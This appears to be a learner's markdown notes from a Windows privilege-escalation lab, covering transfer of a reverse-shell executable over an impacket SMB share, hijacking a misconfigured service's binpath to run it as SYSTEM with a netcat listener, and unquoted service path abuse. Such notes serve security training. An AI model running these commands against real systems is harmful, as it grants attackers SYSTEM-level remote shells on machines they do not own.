## Smb to share files

- Start the smbserver on localmachine with
  `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
- Copy you exploit file using `copy` command on windows command prompt
  `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`

---

## Insecure Service Permissions

- Use `accesschk.exe` (From sysinternals) to check the user accounts permission on **daclsvc** service:
  `accesschk.exe /accepteula -uwcqv user daclsvc`
  ![](2021-02-01_00-21.png)
- If we have read and write permission on `SERVICE_CHANGE_CONFIG` then we can escalate our privs, since it is running as SYSTEM privileges
  ![](2021-02-01_00-25.png)
- **Exploitation**: Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
  `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
  ![](2021-02-01_00-27.png)
  - Now we can start our nc listener and get a rev shell with system privileges
    ![](2021-02-01_00-28.png)
  - And then restart the vulnerable service
    `net start daclsvc`

---

## Unquoted Service Path

- Query the "unquotedsvc" with
  `sc qc unquotedsvc`

  ![](2021-02-01_00-53.png)
  here we can write to "C:\Program Files\Unquoted Path Service" a file called common.exe

```
In order to run SomeExecutable.exe, the system will interpret this path in the following order from 1 to 5.
C:\Program.exe
C:\Program Files\A.exe
C:\Program Files\A Subfolder\B.exe
C:\Program Files\A Subfolder\B Subfolder\C.exe
C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe

```
